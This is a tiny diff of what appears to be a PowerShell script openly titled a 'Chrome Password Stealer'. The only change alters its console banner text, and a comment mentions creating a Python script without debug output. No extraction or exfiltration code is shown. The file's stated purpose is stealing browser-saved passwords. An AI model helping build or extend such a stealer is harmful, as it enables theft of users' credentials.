@@ -1,6 +1,6 @@
 # Chrome Password Stealer - Clean Version
 
-Write-Host "=== Chrome Password Extractor ===" -ForegroundColor Cyan
+Write-Host "=== Chrome Password Extractor dihh ===" -ForegroundColor Cyan
 Write-Host ""
 
 # Create Python script (NO debug output)
